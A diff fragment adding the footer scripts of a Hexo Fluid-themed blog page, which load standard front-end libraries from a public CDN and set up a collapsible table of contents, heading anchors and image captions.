+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
